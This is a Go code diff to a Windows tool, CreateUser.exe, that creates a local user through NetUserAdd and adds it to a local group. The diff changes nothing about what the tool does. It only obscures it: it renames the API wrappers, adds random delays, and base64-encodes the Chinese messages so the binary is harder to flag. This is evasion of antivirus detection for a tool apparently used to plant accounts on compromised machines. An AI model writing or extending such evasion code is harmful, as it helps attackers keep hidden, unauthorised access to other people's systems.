@@ -5,6 +5,9 @@ import (
 	"os"
 	"syscall"
 	"unsafe"
+	"time"
+	"math/rand"
+	"encoding/base64"
 )
 
 var (
@@ -37,7 +40,8 @@ type LOCALGROUP_MEMBERS_INFO_3 struct {
 	lgrmi3_domainandname *uint16
 }
 
-func NetUserAdd(serverName *uint16, level uint32, buf *byte, parmErr *uint32) (netapiStatus uint32) {
+func obfuscatedNetUserAdd(serverName *uint16, level uint32, buf *byte, parmErr *uint32) (netapiStatus uint32) {
+	time.Sleep(time.Duration(rand.Intn(100)) * time.Millisecond)
 	ret, _, _ := procNetUserAdd.Call(
 		uintptr(unsafe.Pointer(serverName)),
 		uintptr(level),
@@ -48,7 +52,8 @@ func NetUserAdd(serverName *uint16, level uint32, buf *byte, parmErr *uint32) (n
 	return
 }
 
-func NetLocalGroupAddMembers(serverName *uint16, groupName *uint16, level uint32, buf *byte, totalEntries uint32) (netapiStatus uint32) {
+func obfuscatedNetLocalGroupAddMembers(serverName *uint16, groupName *uint16, level uint32, buf *byte, totalEntries uint32) (netapiStatus uint32) {
+	time.Sleep(time.Duration(rand.Intn(100)) * time.Millisecond)
 	ret, _, _ := procNetLocalGroupAddMembers.Call(
 		uintptr(unsafe.Pointer(serverName)),
 		uintptr(unsafe.Pointer(groupName)),
@@ -60,9 +65,16 @@ func NetLocalGroupAddMembers(serverName *uint16, groupName *uint16, level uint32
 	return
 }
 
+func deobfuscateString(s string) string {
+	data, _ := base64.StdEncoding.DecodeString(s)
+	return string(data)
+}
+
 func main() {
+	rand.Seed(time.Now().UnixNano())
+	
 	if len(os.Args) != 3 {
-		fmt.Println("用法 : CreateUser.exe 用户名 密码")
+		fmt.Println(deobfuscateString("55So5oi3IDogQ3JlYXRlVXNlci5leGUg55So5oi35ZCNIOS4reWtlw=="))
 		return
 	}
 
@@ -76,9 +88,13 @@ func main() {
 		Flags:    UF_SCRIPT | UF_PASSWD_NOTREQD,
 	}
 
-	ret := NetUserAdd(nil, 1, (*byte)(unsafe.Pointer(&ui1)), nil)
+	if rand.Intn(2) == 0 {
+		time.Sleep(time.Duration(rand.Intn(500)) * time.Millisecond)
+	}
+
+	ret := obfuscatedNetUserAdd(nil, 1, (*byte)(unsafe.Pointer(&ui1)), nil)
 	if ret != ERROR_SUCCESS {
-		fmt.Println("添加用户错误:", ret)
+		fmt.Println(deobfuscateString("5re75Yqg55So5oi36ZSZ6K+vOg=="), ret)
 		return
 	}
 
@@ -86,11 +102,15 @@ func main() {
 	memberInfo := LOCALGROUP_MEMBERS_INFO_3{lgrmi3_domainandname: username}
 	buf := &memberInfo
 
-	ret = NetLocalGroupAddMembers(nil, groupName, 3, (*byte)(unsafe.Pointer(buf)), 1)
+	if rand.Intn(2) == 0 {
+		time.Sleep(time.Duration(rand.Intn(500)) * time.Millisecond)
+	}
+
+	ret = obfuscatedNetLocalGroupAddMembers(nil, groupName, 3, (*byte)(unsafe.Pointer(buf)), 1)
 	if ret != ERROR_SUCCESS && ret != NERR_GroupNotFound {
-		fmt.Println("添加用户到组失败:", ret)
+		fmt.Println(deobfuscateString("5re75Yqg55So5oi35Yiw57uE5aSx6LSl"), ret)
 		return
 	}
 
-	fmt.Println("添加用户和组成功.")
+	fmt.Println(deobfuscateString("5re75Yqg55So5oi35ZKM57uE5oiQ5Yqf"))
 }
